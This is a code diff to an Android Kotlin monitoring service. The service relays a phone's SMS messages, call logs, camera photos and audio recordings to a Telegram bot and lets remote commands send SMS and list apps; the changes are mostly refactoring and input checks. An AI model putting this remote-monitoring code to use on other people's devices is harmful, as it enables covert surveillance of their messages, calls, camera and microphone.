@@ -161,6 +161,14 @@ class MonitoringService : Service() {
             val previous = try { preferencesManager.ringPrevVolume } catch (_: Exception) { -1 }
             val savedAt = try { preferencesManager.ringSavedAt } catch (_: Exception) { 0L }
             if (previous < 0 || savedAt <= 0L) return
+            if (System.currentTimeMillis() - savedAt >= 12 * 60 * 60_000L) {
+                try {
+                    preferencesManager.ringPrevVolume = -1
+                    preferencesManager.ringSavedAt = 0L
+                } catch (_: Exception) {
+                }
+                return
+            }
             val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
             try {
                 audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, previous, 0)
@@ -1317,10 +1325,7 @@ class MonitoringService : Service() {
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
                 } else {
-                    preferencesManager.pendingSmsNumber = normalized
-                    preferencesManager.pendingSmsText = smsText
-                    preferencesManager.pendingSmsAt = System.currentTimeMillis()
-                    preferencesManager.pendingSmsOwner = senderId
+                    preferencesManager.writeSmsPendingSync(normalized, smsText, System.currentTimeMillis(), senderId)
                     sendToTelegram("\uD83D\uDCE9 SMS to <code>$normalized</code> ready to send. Reply /smsconfirm to confirm (valid for 5 minutes).")
                 }
             }
@@ -1330,10 +1335,7 @@ class MonitoringService : Service() {
                 val stagedAt = preferencesManager.pendingSmsAt
                 val stagedBy = try { preferencesManager.pendingSmsOwner } catch (_: Exception) { "" }
                 if (number.isEmpty() || smsText.isEmpty() || stagedAt <= 0L || System.currentTimeMillis() - stagedAt > 300_000L) {
-                    preferencesManager.pendingSmsNumber = ""
-                    preferencesManager.pendingSmsText = ""
-                    preferencesManager.pendingSmsAt = 0L
-                    preferencesManager.pendingSmsOwner = ""
+                    preferencesManager.writeSmsPendingSync("", "", 0L, "")
                     sendToTelegram("\u23F1\uFE0F No pending SMS. Send /sms \u003cnumber\u003e \u003cmessage\u003e first.")
                 } else if (stagedBy.isNotEmpty() && stagedBy != senderId) {
                     sendToTelegram("\u26D4 Only the requester can confirm this SMS.")
@@ -1343,7 +1345,7 @@ class MonitoringService : Service() {
                     sendToTelegram("\u23F1\uFE0F SMS still sending, please wait.")
                 } else {
                     sendToTelegram("\uD83D\uDCE9 Sending SMS\u2026")
-                    preferencesManager.pendingSmsAt = 0L
+                    preferencesManager.touchSmsPendingSync(0L)
                     smsJob = serviceScope.launch {
                         try {
                             sendSmsPending(number, smsText)
@@ -1420,6 +1422,10 @@ class MonitoringService : Service() {
                 }
             }
             "/apps" -> {
+                if (arg.isNotEmpty() && arg.toIntOrNull() == null) {
+                    sendToTelegram("Usage: /apps [5-50] (default 30)")
+                    return
+                }
                 val limit = arg.toIntOrNull()?.coerceIn(5, 50) ?: 30
                 val apps = listLaunchableApps(limit)
                 if (apps.isEmpty()) {
@@ -1436,11 +1442,11 @@ class MonitoringService : Service() {
                 }
             }
             "/storage" -> {
-                val (cacheBytes, cachePhotos) = withContext(Dispatchers.IO) { cacheStats() }
+                val (cacheBytes, cachePhotos, cacheAudios) = withContext(Dispatchers.IO) { cacheStats() }
                 sendToTelegram(
                     buildString {
                         appendLine("\uD83D\uDCBE <b>Storage</b>")
-                        appendLine("Cache: " + formatBytes(cacheBytes) + " (" + cachePhotos + " photos)")
+                        appendLine("Cache: " + formatBytes(cacheBytes) + " (" + cachePhotos + " photos, " + cacheAudios + " audio)")
                         appendLine("Queued: ${messageQueue.getQueueSize()}")
                     }
                 )
@@ -1772,7 +1778,7 @@ class MonitoringService : Service() {
                     }
                     val sentSmsPart = sendFitted(message)
                     try {
-                        preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
+                        preferencesManager.setSmsCursorSync(maxOf(preferencesManager.lastSmsId, part.maxOf { it.id }))
                     } catch (_: Exception) {
                     }
                     if (!sentSmsPart) {
@@ -1808,8 +1814,7 @@ class MonitoringService : Service() {
                         if (latest.date > preferencesManager.lastCallTimestamp ||
                             (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
                         ) {
-                            preferencesManager.lastCallTimestamp = latest.date
-                            preferencesManager.lastCallId = latest.id
+                            preferencesManager.setCallCursorSync(latest.date, latest.id)
                         }
                     } catch (_: Exception) {
                     }
@@ -1876,7 +1881,7 @@ class MonitoringService : Service() {
                 for (part in smsPage.chunked(10)) {
                     val sentSms = sendFitted(formatSmsMessage(part))
                     smsCursor = maxOf(smsCursor, part.maxOf { it.id })
-                    try { preferencesManager.lastSmsId = smsCursor } catch (_: Exception) { }
+                    try { preferencesManager.setSmsCursorSync(smsCursor) } catch (_: Exception) { }
                     if (sentSms) {
                         smsSentAny = true
                     } else {
@@ -1907,8 +1912,7 @@ class MonitoringService : Service() {
                         if (latest.date > preferencesManager.lastCallTimestamp ||
                             (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
                         ) {
-                            preferencesManager.lastCallTimestamp = latest.date
-                            preferencesManager.lastCallId = latest.id
+                            preferencesManager.setCallCursorSync(latest.date, latest.id)
                         }
                     } catch (_: Exception) {
                     }
@@ -1988,7 +1992,7 @@ class MonitoringService : Service() {
     private fun reopenSmsPending() {
         try {
             if (preferencesManager.pendingSmsNumber.isNotEmpty() && preferencesManager.pendingSmsText.isNotEmpty()) {
-                preferencesManager.pendingSmsAt = System.currentTimeMillis()
+                preferencesManager.touchSmsPendingSync(System.currentTimeMillis())
             }
         } catch (_: Exception) {
         }
@@ -2069,11 +2073,8 @@ class MonitoringService : Service() {
                 }
                 val confirmed = withTimeoutOrNull(60_000L + (expected - 1) * 30_000L) { delivered.await() } ?: false
                 if (confirmed) {
-                    preferencesManager.lastSmsSendAt = System.currentTimeMillis()
-                    preferencesManager.pendingSmsNumber = ""
-                    preferencesManager.pendingSmsText = ""
-                    preferencesManager.pendingSmsAt = 0L
-                    preferencesManager.pendingSmsOwner = ""
+                    preferencesManager.setLastSmsSendAtSync(System.currentTimeMillis())
+                    preferencesManager.writeSmsPendingSync("", "", 0L, "")
                     sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
                 } else if (okCount.get() > 0) {
                     reopenSmsPending()
@@ -2230,7 +2231,7 @@ class MonitoringService : Service() {
                     messageQueue.addMessage(message)
                     MessageScheduler.scheduleMessageSend(this)
                 }
-                return queueOnFail
+                return false
             }
             if (message.length > 4096) {
                 android.util.Log.e("MonitoringService", "Message too long: ${message.length} chars, splitting")
@@ -2245,7 +2246,7 @@ class MonitoringService : Service() {
                     messageQueue.addMessage(message)
                     MessageScheduler.scheduleMessageSend(this)
                 }
-                return queueOnFail
+                return false
             }
 
             val hasNetwork = hasNetwork()
@@ -2257,7 +2258,7 @@ class MonitoringService : Service() {
                     messageQueue.addMessage(message)
                     MessageScheduler.scheduleMessageSend(this)
                 }
-                return queueOnFail
+                return false
             }
 
             val telegramMessage = TelegramMessage(
@@ -2285,7 +2286,7 @@ class MonitoringService : Service() {
                     messageQueue.addMessage(message)
                     MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
                 }
-                return queueOnFail
+                return false
             } else if (response.code() == 401 || response.code() == 403) {
                 android.util.Log.e("MonitoringService", "Auth rejected (${response.code()}), queuing until credentials are fixed")
                 try {
@@ -2297,7 +2298,7 @@ class MonitoringService : Service() {
                     messageQueue.addMessage(message)
                     MessageScheduler.scheduleMessageSend(this)
                 }
-                return queueOnFail
+                return false
             } else if (response.code() == 400) {
                 val goneBody = try { response.errorBody()?.string() } catch (_: Exception) { null }
                 if (NetworkUtils.isChatMissing(goneBody)) {
@@ -2314,7 +2315,7 @@ class MonitoringService : Service() {
                         messageQueue.addMessage(message)
                         MessageScheduler.scheduleMessageSend(this)
                     }
-                    return queueOnFail
+                    return false
                 }
                 val plain = message.replace(TAG_STRIP_REGEX, "")
                 if (plain != message) {
@@ -2334,7 +2335,7 @@ class MonitoringService : Service() {
                                 messageQueue.addMessage(plain)
                                 MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
                             }
-                            return queueOnFail
+                            return false
                         } else if (fallbackResp.code() == 401 || fallbackResp.code() == 403) {
                             try {
                                 preferencesManager.credentialError = fallbackResp.code().toString()
@@ -2345,13 +2346,13 @@ class MonitoringService : Service() {
                                 messageQueue.addMessage(plain)
                                 MessageScheduler.scheduleMessageSend(this)
                             }
-                            return queueOnFail
+                            return false
                         } else if (fallbackResp.code() == 408 || fallbackResp.code() >= 500) {
                             if (queueOnFail) {
                                 messageQueue.addMessage(plain)
                                 MessageScheduler.scheduleMessageSend(this)
                             }
-                            return queueOnFail
+                            return false
                         } else {
                             android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
                             try {
@@ -2366,7 +2367,7 @@ class MonitoringService : Service() {
                             messageQueue.addMessage(plain)
                             MessageScheduler.scheduleMessageSend(this)
                         }
-                        return queueOnFail
+                        return false
                     }
                 } else {
                     android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
@@ -2383,7 +2384,7 @@ class MonitoringService : Service() {
                     messageQueue.addMessage(message)
                     MessageScheduler.scheduleMessageSend(this)
                 }
-                return queueOnFail
+                return false
             }
         } catch (e: kotlinx.coroutines.CancellationException) {
             throw e
@@ -2393,7 +2394,7 @@ class MonitoringService : Service() {
                 messageQueue.addMessage(message)
                 MessageScheduler.scheduleMessageSend(this)
             }
-            return queueOnFail
+            return false
         }
     }
 
@@ -3274,22 +3275,24 @@ class MonitoringService : Service() {
         }
     }
 
-    private fun cacheStats(): Pair<Long, Int> {
+    private fun cacheStats(): Triple<Long, Int, Int> {
         var bytes = 0L
         var photos = 0
+        var audios = 0
         try {
             for (file in cacheDir.walkTopDown()) {
                 try {
                     if (file.isFile) {
                         bytes += file.length()
                         if (file.parent == cacheDir.absolutePath && file.name.startsWith("camera_") && file.name.endsWith(".jpg")) photos++
+                        if (file.parent == cacheDir.absolutePath && file.name.startsWith("audio_") && file.name.endsWith(".m4a")) audios++
                     }
                 } catch (_: Exception) {
                 }
             }
         } catch (_: Exception) {
         }
-        return bytes to photos
+        return Triple(bytes, photos, audios)
     }
 
     private fun formatBytes(bytes: Long): String {
